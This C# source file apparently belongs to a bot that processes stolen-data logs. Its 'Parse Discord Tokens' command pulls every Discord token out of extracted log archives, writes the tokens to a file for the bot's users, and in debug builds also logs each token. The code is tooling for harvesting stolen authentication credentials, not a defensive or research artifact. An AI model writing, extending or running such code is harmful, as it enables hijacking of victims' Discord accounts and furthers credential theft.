using Bot.Commands.Base;
using Bot.Models.Abstractions;
using Bot.Models.Data;
using Bot.Parsers.Abstractions;
using Bot.Services;

namespace Bot.Commands.User.Callbacks {
	[RegisterTransient<ICommand<UpdateBotCallbackQuery>>(ServiceKey = "user_discord")]
	public class DiscordCallback(ILogger<DiscordCallback> logger, [FromKeyedServices("parser_discord")] IFileParser<string> parser, Client client, TasksManager tasks, FilesManager files) : ProcessCallback(
		category: "",
		service: "Discord",
		file_type: "txt",
		task_name: "Parse Discord Tokens",
		not_found_message: "Tokens not found",
		hashtags: "#discord",
		
		client, tasks, files) {
		private protected override async Task<FileEntity?> _ParseAsync(string logs_name) {
			var tokens = parser.FromLogs(Path.Combine(Constants.Directory_Extracted, logs_name))
							   .ToAsyncEnumerable()
							   .SelectMany(x => x);

			if (!await tokens.AnyAsync()) {
				return null;
			}
			
			await using (var memory = new MemoryStream()) {
				await using (var writer = new StreamWriter(memory, leaveOpen: true)) {
					await foreach (var token in tokens) {
						await writer.WriteLineAsync(token);

#if DEBUG
						logger.LogInformation(token);
#endif
					}
				}

				memory.Position = 0;

				return await files.SaveFileAsync(stream => memory.CopyTo(stream), Category, Service, logs_name, FileType);
			}
		}
	}
}